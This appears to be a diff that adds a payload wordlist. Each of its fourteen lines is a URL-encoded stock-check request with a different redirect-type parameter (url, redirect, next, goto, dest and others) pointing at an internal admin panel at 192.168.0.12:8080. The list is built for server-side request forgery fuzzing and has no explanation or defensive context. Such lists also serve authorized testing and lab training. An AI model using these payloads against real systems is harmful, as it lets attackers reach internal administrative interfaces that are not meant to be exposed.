@@ -1,0 +1,14 @@
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26path%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26url%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26redirect%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26next%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26return%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26returnUrl%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26goto%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26target%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26dest%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26destination%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26continue%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26forward%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26link%3Dhttp://192.168.0.12:8080/admin
+%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1%26redir%3Dhttp://192.168.0.12:8080/admin
